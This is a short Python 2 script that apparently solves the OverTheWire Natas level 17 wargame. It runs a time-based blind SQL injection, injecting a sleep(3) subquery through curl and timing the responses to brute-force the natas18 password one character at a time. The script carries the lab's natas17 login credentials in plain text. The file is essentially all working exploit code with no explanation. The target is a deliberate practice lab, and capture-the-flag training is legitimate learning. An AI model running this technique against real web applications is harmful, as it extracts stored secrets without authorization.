import subprocess, time


start = ''

asciichars = list(range(0x30, 0x3a) + range(0x41, 0x5b) + range(0x61, 0x7b))

while True:
    found = False
    # asciichars = [ord('8')]
    for i in asciichars:
        trypass = start + chr(i) + '%'
        print "trying", repr(trypass)
        t0 = time.time()
        subquery = """select sleep(3) from users where username = "natas18" """
        subquery = """select sleep(3) from users where username = "natas18" and password LIKE BINARY "~~" """.replace("~~", trypass)
        out = subprocess.check_output("""curl --basic -u natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw http://natas17.natas.labs.overthewire.org/index.php?debug=yes -F username='" and (~~~)  #' 2>/dev/null """.replace("~~~", subquery), shell=True)
        elapsed = time.time() - t0
        if elapsed > 3.0:
            start += chr(i)
            found = True
            break
    if not found:
        break
print "@@@", start


